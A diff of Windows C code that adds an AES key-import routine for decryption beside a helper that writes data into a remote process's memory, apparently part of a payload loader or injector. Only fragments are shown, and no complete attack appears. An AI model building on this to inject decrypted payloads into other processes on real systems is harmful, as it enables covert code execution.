@@ -119,7 +119,7 @@ int allocateAndCopy(LPCVOID code, DWORD codeSize, LPVOID * remoteAddr){
 
 
 
-int allocateAndCopyRemote(HANDLE processHandle, LPCVOID code, DWORD codeSize, LPVOID * remoteAddr){
+int allocateAndCopyRemote(HANDLE processHandle, LPCVOID code, DWORD codeSize, LPVOID *remoteAddr){
 
 
     // Allocate bytes to process memory
@@ -139,6 +139,45 @@ int allocateAndCopyRemote(HANDLE processHandle, LPCVOID code, DWORD codeSize, LP
         exit(EXIT_FAILURE);
     }
     MESSAGE(OKAY, "%ld bytes of data successfully wrote in memory of the remote process\n", codeSize);
+
+    return EXIT_SUCCESS;
+}
+
+
+
+int getAesImportedKey(ALG_ID aesAlgo, const BYTE* algoMode, LPVOID key, DWORD keySize, BYTE initializationVector[], HCRYPTKEY *keyHandle, HCRYPTPROV *cspHandle){
+
+    DWORD       keyBlobHeaderSize   = sizeof(BLOBHEADER);
+    DWORD       dwordSize           = sizeof(DWORD);
+    BYTE        keyBlob[keyBlobHeaderSize + dwordSize + keySize];
+    BLOBHEADER  *keyBlobHeader;
+
+     // Get a handle to a key container with a cryptographic service provider
+    if (!CryptAcquireContext(cspHandle, NULL, MS_ENH_RSA_AES_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
+        MESSAGE(FAIL, "Impossible to  Get a handle to a key container\n");
+        PRINT_ERROR(CryptAcquireContext);
+        exit(EXIT_FAILURE);
+    }
+    // Generate key handle by importation
+    keyBlobHeader = (BLOBHEADER*)keyBlob;
+    keyBlobHeader->bType = PLAINTEXTKEYBLOB;
+    keyBlobHeader->bVersion = CUR_BLOB_VERSION;
+    keyBlobHeader->reserved = 0;
+    keyBlobHeader->aiKeyAlg = aesAlgo;
+    
+    memcpy(keyBlob + keyBlobHeaderSize, &keySize, dwordSize);
+    memcpy(keyBlob + keyBlobHeaderSize + dwordSize, key, keySize);  
+
+    if(!CryptImportKey(*cspHandle, keyBlob, sizeof(keyBlob), 0, 0, keyHandle)){
+        MESSAGE(FAIL, "Impossible to import the key\n");
+        PRINT_ERROR(CryptImportKey);
+        exit(EXIT_FAILURE);
+    }
+    MESSAGE(OKAY, "AES Key successfully imported for use\n");
+
+    // Set key parameter for decryption
+    CryptSetKeyParam(*keyHandle, KP_IV, initializationVector, 0);
+    CryptSetKeyParam(*keyHandle, KP_MODE, algoMode, 0);
 
     return EXIT_SUCCESS;
 }
